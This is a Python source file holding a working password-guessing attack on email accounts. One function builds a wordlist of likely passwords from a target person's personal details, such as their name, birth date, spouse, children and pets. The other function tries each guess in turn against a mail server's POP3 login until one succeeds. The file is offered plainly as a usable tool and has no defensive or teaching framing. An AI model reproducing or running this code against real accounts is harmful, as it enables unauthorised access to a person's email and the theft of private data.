import time
import poplib
from io import StringIO
import sys

def dos(emailID, mailServer):
    old_stdout = sys.stdout
    sys.stdout = mystdout = StringIO()
    passfile= "password.txt"

    def hit(email,Pass):
        try:
            myEmailConnection = poplib.POP3_SSL(mailServer)
            myEmailConnection.user(email)
            myEmailConnection.pass_(Pass)
        except:
            print('>> Trying Attempt Failed: '+Pass)
            return False
        else:
            print('>> Password Found: '+Pass)
            return True

    f=open(passfile)
    for i in f:
        if(hit(emailID,i)):
            break
    sys.stdout = old_stdout
    return mystdout.getvalue().split('\n')

def wordlist(targetInfo):
    old_stdout = sys.stdout
    sys.stdout = mystdout = StringIO()

    FirstName = targetInfo['FirstName']
    LastName = targetInfo['LastName']
    TargetYear = targetInfo['TargetYear']
    TargetMonth = targetInfo['TargetMonth']
    TargetDay = targetInfo['TargetDay']
    married = targetInfo['married']
    kids = targetInfo['kids']
    pets = targetInfo['pets']
    flag_married = False
    flag_kids = False
    flag_pets = False
    if married == "Y":
        targetspousename = targetInfo['targetspousename']
        targetmarrieddate = targetInfo['targetmarrieddate']
        flag_married = True
    elif married == "N":
        targetspousename = ""
        targetmarrieddate = ""
    else:
        print(">> Invalid Married Entry. Please enter Y or N.")
    if kids == "Y":
        targetkidname = targetInfo['targetkidname']
        targetkidage = targetInfo['targetkidage']
        flag_kids = True
    elif kids == "N":
        targetkidname = ""
        targetkidage = ""
    else:
        print(">> Invalid Kids Entry. Please enter Y or N.")
    if pets == "Y":
        targetpetname = targetInfo['targetpetname']
        targetpettype = targetInfo['targetpettype']
        flag_pets = True
    elif pets == "N":
        targetpetname = ""
        targetpettype = ""
    else:
        print(">> Invalid Pets Entry. Please enter Y or N.")
    print(">> Creating list of possible passwords...This may take some time")
    file = open('password.txt', 'w')
    file.write(FirstName)
    file.write("\n")
    file.write (FirstName + LastName)
    file.write("\n")
    file.write(LastName + FirstName)
    file.write("\n")
    file.write(LastName)
    file.write("\n")
    file.write(FirstName + LastName + TargetYear)
    file.write("\n")
    file.write(FirstName + TargetYear)
    file.write("\n")
    file.write(LastName + TargetYear)
    file.write("\n")
    file.write(TargetYear + FirstName + LastName)
    file.write("\n")
    file.write(FirstName + LastName + TargetDay)
    file.write("\n")
    file.write(FirstName + LastName + TargetMonth)
    file.write("\n")
    file.write(FirstName + LastName + TargetDay + TargetMonth + TargetYear)
    file.write("\n")
    if flag_married:
        file.write(FirstName + targetspousename)
        file.write("\n")
        file.write(targetspousename + LastName)
        file.write("\n")
        file.write(targetspousename + FirstName)
        file.write("\n")
        file.write(targetspousename)
        file.write("\n")
        file.write(targetspousename + LastName)
        file.write("\n")
        file.write(targetspousename + TargetYear)
        file.write("\n")
        file.write(targetspousename + targetmarrieddate)
        file.write("\n")
        file.write(targetspousename + LastName + targetmarrieddate)
        file.write("\n")
    if flag_kids :
        file.write(targetkidname)
        file.write("\n")
        file.write(targetkidname + targetkidage)
        file.write("\n")
        file.write(targetkidage + targetkidname)
        file.write("\n")
        file.write(targetkidname + LastName)
        file.write("\n")
        file.write(targetkidname + LastName + targetkidage)
        file.write("\n")
    if flag_pets:
        file.write(targetpetname)
        file.write("\n")
        file.write(targetpetname + targetpettype)
        file.write("\n")
        file.write(targetpetname + LastName)
        file.write("\n")
        file.write(targetpetname + targetpettype + LastName)
    file.close
    print(">> DONE! saved as: password.txt")
    sys.stdout = old_stdout
    return mystdout.getvalue().split('\n')